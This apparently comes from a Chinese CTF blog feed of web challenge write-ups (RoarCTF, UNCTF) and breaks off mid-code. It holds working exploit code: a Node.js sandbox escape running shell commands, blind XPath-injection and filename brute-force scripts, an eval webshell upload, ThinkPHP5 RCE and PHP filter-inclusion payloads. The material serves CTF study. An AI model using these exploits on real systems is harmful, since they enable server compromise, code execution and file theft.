<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"e"</span>:<span class="string">"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)"</span>,<span class="attr">"first"</span>:<span class="string">"0"</span>,<span class="attr">"second"</span>:[<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="ezlogin">ezlogin</span></h2><p>Xpath注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">s = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/xml'</span>&#125;</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://47.92.255.176:1004/'</span></span><br><span class="line">payload = <span class="string">"' or string-length(name(/*[1]))=&#123;&#125; or '1"</span> <span class="comment">#根元素下的节点长度</span></span><br><span class="line">payload1 = <span class="string">"' or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span> <span class="comment">#根元素 root</span></span><br><span class="line">payload2 = <span class="string">"' or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span></span><br><span class="line">payload3 = <span class="string">"' or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span></span><br><span class="line">payload4 = <span class="string">"' or substring(name(/root/accounts/user/*[1]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span> <span class="comment">#id</span></span><br><span class="line">payload5 = <span class="string">"' or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span> <span class="comment">#username</span></span><br><span class="line">payload6 = <span class="string">"' or substring(name(/root/accounts/user/*[3]), &#123;&#125;, 1)='&#123;&#125;' or '1"</span> <span class="comment">#password</span></span><br><span class="line">payload7 = <span class="string">"' or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;' or '1"</span> <span class="comment">#adm1n</span></span><br><span class="line">payload7 = <span class="string">"' or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or '1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> s:</span><br><span class="line">        token = re.search(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,r.get(url).text)[<span class="number">1</span>]</span><br><span class="line">        data = <span class="string">"&lt;username&gt;"</span>+payload7.format(i,b)+<span class="string">"&lt;/username&gt;&lt;password&gt;12&lt;/password&gt;&lt;token&gt;"</span>+token+<span class="string">"&lt;/token&gt;"</span>;</span><br><span class="line">        result = r.post(url=url+<span class="string">'login.php'</span>,headers=headers,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> result:</span><br><span class="line">            flag += b</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>拿到用户名+密码登陆<br>文件包含<br><code>/admin.php?file=Php://Filter/Read=convert.Base64-encode/resource=/flag</code></p>
<h2><span id="web">Web🐶</span></h2><p>Web+密码学</p>
<h2><span id="ezshiro">ezshiro</span></h2>]]></content>
  </entry>
  <entry>
    <title>RoarCTF_Web</title>
    <url>/2019/11/15/RoarCTF-Web/</url>
    <content><![CDATA[<h1><span id="roarctf_web">RoarCTF_Web</span></h1><p>[TOC]</p>
<h2><span id="easy_calc">easy_calc</span></h2><p>国赛calc的+++强版，还加了waf<br>收集了各位师傅的解法，有三种</p>
<h3><span id="http协议http请求走私">http协议,http请求走私</span></h3><p>（可能会新开一篇blog去研究<br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a><br><a href="https://xz.aliyun.com/t/6631" target="_blank" rel="noopener">https://xz.aliyun.com/t/6631</a><br><img src="/2019/11/15/RoarCTF-Web/1.png" alt><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/calc.php?num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?num=var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(highlight_file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">/calc.php?num=var_dump(readfile(chr(47).base_convert(25254448,10,36)))</span><br></pre></td></tr></table></figure>

<h3><span id="php字符串解析特性bypass">php字符串解析特性Bypass</span></h3><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<h3><span id="硬刚按位与amp和按位或">(硬刚)按位与&amp;和按位或|</span></h3><p>它把<code>^</code>(按位异或)过滤了,那我还有<code>&amp;</code>(按位与)、<code>|</code>(按位或)、<code>～</code>(求反运算)、<code>&lt;&lt;</code>(左移运算)、<code>&gt;&gt;</code>(右移运算)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:<br>phpinfo()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))&amp;((((0/0).(0))&#123;1&#125;)|(((1).(0))&#123;0&#125;))).((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;)).(((((2).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))&amp;((((0/0).(0))&#123;1&#125;)|(((1).(0))&#123;0&#125;))).(((999**999).(1))&#123;0&#125;).(((999**999).(1))&#123;1&#125;).(((999**999).(1))&#123;2&#125;).((((999**999).(1))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))()</span><br></pre></td></tr></table></figure>

<p>(scandir)(../../../)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))).(((999**999).(1))&#123;0&#125;).(((0/0).(0))&#123;1&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).((((0/0).(0))&#123;1&#125;)|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))).((((0/0).(0))&#123;1&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).(((999**999).(1))&#123;1&#125;).(((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))|((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))))((((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))))))</span><br></pre></td></tr></table></figure>

<p>(serIALIze)(FILe(/f1agg))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))).(((999**999).(1))&#123;0&#125;).(((0/0).(0))&#123;1&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((999**999).(1))&#123;2&#125;).(((999**999).(1))&#123;0&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((999**999).(1))&#123;2&#125;)|((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))).(((1).(1))&#123;0&#125;).((((0/0).(0))&#123;1&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).((((999**999).(1))&#123;2&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).((((999**999).(1))&#123;2&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;))))</span><br></pre></td></tr></table></figure>

<h2><span id="simple_upload">simple_upload</span></h2><p>发现是Thinkphp框架，和gayhub下的<code>Thinkphp</code>框架对比，发现<code>$upload-&gt;allowExts</code>参数调用错误(<code>allowExts</code>是Thinkphp5的参数，而Thinkphp3是<code>exts</code>)，所以没了文件上传限制<br><img src="/2019/11/15/RoarCTF-Web/2.png" alt><br>于是可以任意上传（但是前面的<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;</code>把php文件给过滤了<br>上传exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://149.129.104.250:1005/"</span></span><br><span class="line">payload = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">file_shell1 = &#123;</span><br><span class="line">     <span class="string">"file"</span>:(<span class="string">'shell.txt'</span>,<span class="string">"&lt;?php @eval($_POST['pass']); ?&gt;"</span>)</span><br><span class="line">&#125;</span><br><span class="line">file_shell2 = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">'shell.php'</span>,<span class="string">"&lt;?php @eval($_POST['pass']); ?&gt;"</span>)</span><br><span class="line">&#125;</span><br><span class="line">file_shell3 = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">"dkk.txt"</span>,<span class="string">"dkkfile"</span>)</span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(payload,files = file_shell1)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#print(file_shell2)</span></span><br><span class="line">req = requests.post(payload,files = file_shell2)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">req = requests.post(payload,files = file_shell3)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure>

<p>回显(第二条文件上传失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-11-17\/5dd01f6a43b9e.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-11-17\/5dd01f6aceed3.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>两种解法：</p>
<h3><span id="thinkphp3的文件上传文件名规律">ThinkPHP3的文件上传文件名规律</span></h3><p>上面的上传脚本其实是把第二个我们的shell文件上传到网站的，我们只要知道我们上传shell的文件名就可以了<br>查看Thinkphp手册<a href="http://document.thinkphp.cn/manual_3_2.html#upload" target="_blank" rel="noopener">http://document.thinkphp.cn/manual_3_2.html#upload</a><br>发现它是用时间戳的形式命名，我们的shell的文件名就在第一和第三个文件之间，写脚本爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1&#125;</span></span><br><span class="line"><span class="comment"># s = "1234567890abcdef"</span></span><br><span class="line"><span class="comment"># str = "12345"</span></span><br><span class="line"><span class="comment"># for i in str:</span></span><br><span class="line"><span class="comment">#     for j in s:</span></span><br><span class="line"><span class="comment">#         for k in s:</span></span><br><span class="line"><span class="comment">#             for l in s:</span></span><br><span class="line"><span class="comment">#                 for m in s:</span></span><br><span class="line"><span class="comment">#                     url = "http://8be4b11d-f5a8-45a7-bba6-92f57620dcf7.node3.buuoj.cn/Public/Uploads/2019-11-15/5dce6955%s%s%s%s%s.php"%(i,j,k,l,m)</span></span><br><span class="line"><span class="comment">#                     r = requests.get(url)</span></span><br><span class="line"><span class="comment">#                     print(url)</span></span><br><span class="line"><span class="comment">#                     if r.status_code != 404:</span></span><br><span class="line"><span class="comment">#                         print(url+"******************************")</span></span><br><span class="line"><span class="comment">#                         break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9075079</span>,<span class="number">9508453</span>):</span><br><span class="line">    url = <span class="string">"http://deecf618-6aca-4ee4-9873-a5c982fb45a7.node3.buuoj.cn/Public/Uploads/2019-11-15/5dce8f19&#123;&#125;.php"</span>.format(str(hex(i)[<span class="number">2</span>:]))</span><br><span class="line">    print(url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        print(url+<span class="string">"******************************"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>单线程爆破太慢了，来个多线程版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">咕</span><br></pre></td></tr></table></figure>

<p>咕咕咕（拿<a href="https://github.com/ring04h/dirfuzz" target="_blank" rel="noopener">dirfuzz</a>魔改一下</p>
<h3><span id="thinkphp3的一个bypass后缀名利用点">ThinkPHP3的一个bypass后缀名利用点</span></h3><p>如果题目更改上传文件的命名规则，那这道题是不是就不能下手了，来个sao玩意<br>审计Thinkphp3.2.5的上传文件源码<code>Upload.class.php</code>的157行<br><img src="/2019/11/15/RoarCTF-Web/3.png" alt><br><code>strip_tags</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strip_tags</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">strip_tags — 从字符串中去除 HTML 和 PHP 标记</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/15/RoarCTF-Web/4.png" alt><br>把上传文件名改为<code>shell.p&lt;img&gt;hp</code><br><img src="/2019/11/15/RoarCTF-Web/5.png" alt><br>直接访问<code>.php</code>文件嘿嘿</p>
<h2><span id="easy_java">easy_java</span></h2><p>题目给了个登陆框<br>admin弱密码登陆进去没什么有用的东西<br><code>help</code>里面下载文件报错，java写的web<br>尝试<code>POST</code>传<code>filename=help.docx</code>成功下载，爆破一下康康有什么文件下载<br><img src="/2019/11/15/RoarCTF-Web/6.png" alt><br><img src="/2019/11/15/RoarCTF-Web/7.png" alt><br>查看<code>/Flag</code>路由<br><img src="/2019/11/15/RoarCTF-Web/8.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>我们根据Jsp的目录规则找到FlagController的class文件<br><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<h2><span id="dist">dist</span></h2><p>golang，不会在学</p>
<h2><span id="online-proxy">Online Proxy</span></h2><p>以为是ssrf打内网，结果是XFF处sql注入</p>
<h3><span id="参考链接">参考链接</span></h3><p><a href="https://xz.aliyun.com/t/6576#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6576#toc-6</a><br><a href="https://www.yourhome.ren/index.php/sec/619.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/619.html</a><br><a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">https://github.red/roarctf-web-writeup/</a><br><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc</a><br><a href="https://paper.seebug.org/1059/#easy_calc" target="_blank" rel="noopener">https://paper.seebug.org/1059/#easy_calc</a></p>
]]></content>
  </entry>
  <entry>
    <title>UNCTF_Web_wp</title>
    <url>/2019/11/08/UNCTF-Web-wp/</url>
    <content><![CDATA[<h1><span id="unctf_web复现">UNCTF_Web复现</span></h1><p>[TOC]</p>
<h2><span id="竞技赛">竞技赛</span></h2><h3><span id="nsb-login">NSB Login</span></h3><p>弱密码爆破<br><code>kali有个自带134m的字典</code></p>
<h3><span id="nsb-reset-password">NSB Reset Password</span></h3><p>推测用的<code>session</code>数据库版（手动滑稽<br>在输入过验证码后，<code>session</code>的某个参数值发生改变，再开个网页去找回<code>admin</code>的密码，<code>session</code>中的name就变为<code>admin</code>，再去刚刚的更改密码处输入新密码，登陆<code>admin</code>拿到flag</p>
<h3><span id="checkln">checkln</span></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/calc <span class="built_in">require</span>(<span class="string">'fs'</span>).readFileSync(<span class="string">'../flag'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">/calc <span class="built_in">require</span>(<span class="string">'fs'</span>).readdirSync(<span class="string">'./'</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="easy_pentest">easy_pentest</span></h3><p>一开始访问靶机任意页面都跳转到<code>public/static/not_safe.html</code>下<br>hint:<code>信息泄露</code><br>猜测可能是log日志文件泄露，tp的log文件有规律</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">pbar = tqdm(range(<span class="number">1</span>,<span class="number">13</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2018</span>,<span class="number">2020</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            url = <span class="string">"http://183.129.189.60:10041/runtime/log/"</span> + str(i) +str(j).zfill(<span class="number">2</span>) + <span class="string">"/"</span> + str(k).zfill(<span class="number">2</span>) + <span class="string">".log"</span></span><br><span class="line">            <span class="comment">#print(url + " ==&gt; " + str(requests.get(url).status_code))</span></span><br><span class="line">            <span class="keyword">if</span>(requests.get(url).status_code == <span class="number">200</span>):</span><br><span class="line">                print(url)</span><br><span class="line">            <span class="comment">#pbar.set_description("Processing %s"%i)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/8.png" alt><br>发现有<code>safe_key</code>参数<br><img src="/2019/11/08/UNCTF-Web-wp/9.png" alt><br><code>http://183.129.189.60:10041/public/?safe_key=easy_pentesnt_is_s0fun</code>进去之后发现是ThinkPHP5的，找找有没有通用rce<br><a href="https://xz.aliyun.com/t/6106" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106</a><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=scandir&amp;get[]=/home&amp;filter[]=var_dump</span><br><span class="line">_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=highlight_file&amp;get[]=/home/flag_1sh3r3.txt&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>

<h3><span id="easyxss">EasyXSS</span></h3><p><a href="https://www.zhihu.com/question/22638210" target="_blank" rel="noopener">https://www.zhihu.com/question/22638210</a><br><a href="https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81" target="_blank" rel="noopener">https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81</a><br><a href="https://xz.aliyun.com/t/2266" target="_blank" rel="noopener">https://xz.aliyun.com/t/2266</a></p>
<h3><span id="kampk战队的老家">K&amp;K战队的老家</span></h3><p>打开题目，登陆界面<br><img src="/2019/11/08/UNCTF-Web-wp/1.png" alt><br>fuzz发现过滤了<code>select,and,or,#,-等</code><br>通过万能密码<code>admin||1||&#39;1</code>登陆<br>看到<code>./home.php?m=index</code>,可能有文件包含<br>发现m参数过滤了<code>php,base</code>但是可以大小写绕过，任意文件读取得到源码，但是flag大小写绕不过去，读不到源码<br>目录结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── debug.php</span><br><span class="line">├── flag.php</span><br><span class="line">├── home.php</span><br><span class="line">├── inc</span><br><span class="line">    ├── access.php</span><br><span class="line">    ├── config.php</span><br><span class="line">    ├── db.php</span><br><span class="line">    ├── func.php</span><br><span class="line">    └── session.php</span><br></pre></td></tr></table></figure>

<p>找到应用<code>flag.php</code>的地方<br><img src="/2019/11/08/UNCTF-Web-wp/2.png" alt><br>想要调用<code>__toString</code>魔术方法 -&gt; 把类当字符串输出<br><code>debug</code>类里的<code>debug()</code>可以利用的输出<br><img src="/2019/11/08/UNCTF-Web-wp/3.png" alt><br>在<code>home.php</code>有调用<code>debug()</code><br><img src="/2019/11/08/UNCTF-Web-wp/4.png" alt><br>跟踪<code>debug</code>方法发现前后冲突，但是<code>switch</code>是弱类型比较，所以让<code>$this-&gt;choose = &quot;2&quot;</code>既可绕过<br><img src="/2019/11/08/UNCTF-Web-wp/5.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'%26'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$hack_token = <span class="string">"3ecReK&amp;key"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">"Good Luck :|"</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> debug;</span><br><span 